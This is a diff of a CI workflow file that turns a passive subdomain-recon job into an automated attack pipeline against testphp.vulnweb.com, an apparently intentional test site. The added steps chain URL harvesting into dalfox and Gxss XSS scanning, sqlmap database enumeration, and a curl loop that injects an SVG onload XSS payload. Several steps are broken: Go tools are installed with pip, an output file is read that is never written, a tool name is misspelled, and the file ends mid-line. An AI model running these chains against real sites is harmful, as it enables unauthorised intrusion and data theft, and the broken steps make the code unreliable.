@@ -1,11 +1,11 @@
-name: 'Tomnomnom Tools Scan'
+name: 'Security Tools Scan'
 on:
   push:
     branches: ["main"]
   workflow_dispatch:
 
 jobs:
-  tomnomnom-scan:
+  security-scan:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout repository
@@ -16,7 +16,13 @@ jobs:
         with:
           go-version: '1.21'  # Ensure compatibility with the tools
 
-      - name: Install tools
+      - name: Install Python and other dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y python3 python3-pip curl jq
+          pip3 install waybackpy dalfox gxss
+
+      - name: Install Go tools
         run: |
           export GOPATH=$HOME/go
           export PATH=$PATH:$GOPATH/bin
@@ -29,21 +35,54 @@ jobs:
           go install github.com/tomnomnom/gf@latest
           go install github.com/tomnomnom/anew@latest
           go install github.com/tomnomnom/fff@latest
+          go get -u github.com/tomnomnom/fff
+
+          # Install other tools
+          GO111MODULE=on go get -u -v github.com/lc/gau
+          GO111MODULE=on go get -u -v github.com/tomnomnom/qsreplace
+          GO111MODULE=on go get -u -v github.com/jaeles-project/gospider
+          GO111MODULE=on go get -u -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder
+          GO111MODULE=on go get -u -v github.com/projectdiscovery/findomain
+          GO111MODULE=on go get -u -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
+        shell: bash
+
+      - name: Install NucleiFuzzer and Dependencies
+        run: |
+          # Install NucleiFuzzer
+          git clone https://github.com/0xKayala/NucleiFuzzer.git
+          cd NucleiFuzzer
+          sudo chmod +x install.sh
+          ./install.sh
+          nf -h
+          cd ..
+
+          # Install ParamSpider
+          git clone https://github.com/0xKayala/ParamSpider.git
+
+          # Install Nuclei
+          git clone https://github.com/projectdiscovery/nuclei.git
+          cd nuclei
+          go build
+          sudo mv nuclei /usr/local/bin/
+          cd ..
+
+          # Install Fuzzing Templates
+          git clone https://github.com/0xKayala/fuzzing-templates.git
         shell: bash
 
       - name: Run assetfinder
         run: |
-          ~/go/bin/assetfinder --subs-only example.com > ${{runner.temp}}/assetfinder.out
+          ~/go/bin/assetfinder --subs-only testphp.vulnweb.com > ${{runner.temp}}/assetfinder.out
         shell: bash
 
       - name: Run httprobe
         run: |
-          cat ${{runner.temp}}/assetfinder.out | ~/go/bin/httprobe -p 80,443 > ${{runner.temp}}/httprobe.out
+          cat ${{runner.temp}}/assetfinder.out | ~/go/bin/httprobe -c 50 > ${{runner.temp}}/httprobe.out
         shell: bash
 
       - name: Run waybackurls
         run: |
-          echo example.com | ~/go/bin/waybackurls > ${{runner.temp}}/waybackurls.out
+          echo testphp.vulnweb.com | ~/go/bin/waybackurls > ${{runner.temp}}/waybackurls.out
         shell: bash
 
       - name: Run httpx
@@ -51,51 +90,52 @@ jobs:
           cat ${{runner.temp}}/assetfinder.out | ~/go/bin/httpx -ports 80,443,8080,8443 -title -status-code -json > ${{runner.temp}}/httpx.out
         shell: bash
 
-      - name: Additional Commands
+      - name: Run additional tools
         run: |
-          cat ${{runner.temp}}/httprobe.out | ~/go/bin/anew ${{runner.temp}}/domains
+          # Additional commands
+          cat ${{runner.temp}}/assetfinder.out | ~/go/bin/anew ${{runner.temp}}/domains
           cat ${{runner.temp}}/domains | ~/go/bin/httprobe -c 50 | ~/go/bin/anew ${{runner.temp}}/hosth
           cat ${{runner.temp}}/hosth | ~/go/bin/fff -d 1 -S -o ${{runner.temp}}/roots
           ~/go/bin/gf meg-headers < ${{runner.temp}}/roots
           ~/go/bin/gf servers < ${{runner.temp}}/roots | ~/go/bin/anew ${{runner.temp}}/gf-servers
-        shell: bash
 
-      - name: Display results
-        run: |
-          echo -e "\n\033[1;34m=== Assetfinder Results ===\033[0m"
-          cat ${{runner.temp}}/assetfinder.out
-          echo -e "\033[1;34m=== End of Assetfinder Results ===\033[0m\n"
-          
-          echo -e "\n\033[1;34m=== HTTProbe Results ===\033[0m"
-          cat ${{runner.temp}}/httprobe.out
-          echo -e "\033[1;34m=== End of HTTProbe Results ===\033[0m\n"
-          
-          echo -e "\n\033[1;34m=== WaybackURLs Results ===\033[0m"
-          cat ${{runner.temp}}/waybackurls.out
-          echo -e "\033[1;34m=== End of WaybackURLs Results ===\033[0m\n"
-          
-          echo -e "\n\033[1;34m=== HTTPX Results ===\033[0m"
-          cat ${{runner.temp}}/httpx.out
-          echo -e "\033[1;34m=== End of HTTPX Results ===\033[0m\n"
-          
-          echo -e "\n\033[1;34m=== Additional Results ===\033[0m"
-          cat ${{runner.temp}}/domains
-          cat ${{runner.temp}}/hosth
-          cat ${{runner.temp}}/roots
-          cat ${{runner.temp}}/gf-servers
-          echo -e "\033[1;34m=== End of Additional Results ===\033[0m\n"
-        shell: bash
+          # Run waybackpy for known URLs
+          waybackpy --url testphp.vulnweb.com --user_agent "my-user-agent" --known_urls > ${{runner.temp}}/waybackpy.out
 
-      - name: Upload scan results
-        uses: actions/upload-artifact@v4
-        with:
-          name: tomnomnom-tools-results
-          path: |
-            ${{runner.temp}}/assetfinder.out
-            ${{runner.temp}}/httprobe.out
-            ${{runner.temp}}/waybackurls.out
-            ${{runner.temp}}/httpx.out
-            ${{runner.temp}}/domains
-            ${{runner.temp}}/hosth
-            ${{runner.temp}}/roots
-            ${{runner.temp}}/gf-servers
+          # Run additional security scans
+          echo "assets.testphp.vulnweb.com" | ~/go/bin/waybackurls | ~/go/bin/httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
+
+          # Simple Reflected XSS
+          subfinder -d testphp.vulnweb.com | ~/go/bin/httprobe -c 100 > ${{runner.temp}}/target.txt
+          cat ${{runner.temp}}/target.txt | ~/go/bin/waybackurls | ~/go/bin/gf xss | kxxs
+
+          # Wayback URL collecting
+          cat ${{runner.temp}}/target.txt | ~/go/bin/waybackurls
+
+          # SQL Injection
+          subfinder -d testphp.vulnweb.com | tee -a ${{runner.temp}}/domains
+          cat ${{runner.temp}}/domains | ~/go/bin/httpx | tee -a ${{runner.temp}}/alive.txt
+          cat ${{runner.temp}}/alive.txt | ~/go/bin/waybackurls | tee -a ${{runner.temp}}/urls
+          ~/go/bin/gf sqli ${{runner.temp}}/urls >> ${{runner.temp}}/sqli
+          sqlmap -m ${{runner.temp}}/sqli --dbs --batch
+
+          # SQL Injection One-liner
+          findomain -t testphp.vulnweb.com -q | ~/go/bin/httpx -silent | ~/go/bin/anew | ~/go/bin/waybackurls | ~/go/bin/gf sqli >> ${{runner.temp}}/sqli
+          sqlmap -m ${{runner.temp}}/sqli -batch --random-agent --level 1
+
+          # Subdomains from Wayback Machine
+          gau -subs testphp.vulnweb.com | cut -d / -f 3 | sort -u
+
+          # Collect .js files
+          assetfinder testphp.vulnweb.com | ~/go/bin/waybackurls | grep -E "\\.js(?:onp?)?$" | ~/go/bin/anew
+
+        
+          # Vulnerability detection
+          cat ${{runner.temp}}/waybackurl | grep "php?id="
+          cat ${{runner.temp}}/waybackurl | grep ".xlsx"
+
+          # XSS one-liner
+          cat ${{runner.temp}}/waybackurl | grep '=' | qsreplace '"><svg/onload=alert(1337)>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31mVulnerable"; done
+
+          # Collect JS files using gau
+          gau -subs testphp.vulnweb.com | cut -d"?" -f1 | grep -E "\\.js(?:onp?)?$" | tee ${{runner.temp
